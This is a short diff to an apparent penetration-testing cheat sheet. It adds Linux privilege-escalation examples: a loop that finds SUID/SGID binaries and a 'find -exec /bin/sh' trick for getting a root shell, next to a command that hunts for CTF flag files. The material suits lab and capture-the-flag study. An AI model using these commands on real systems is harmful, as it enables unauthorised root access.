@@ -132,6 +132,9 @@ Find and display the proof.txt or flag.txt - LOOT! `cat ``find / -name proof.txt
 
 
 ----------------------- PrivEx examples -----------------------
-Find Command
-    touch test
-    find test -exec "/bin/sh" \;
+Locate apps that you can run and already has root permission.
+    # for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
+    
+    Obtaining root shell with the find command
+        # touch test
+        # find test -exec "/bin/sh" \;
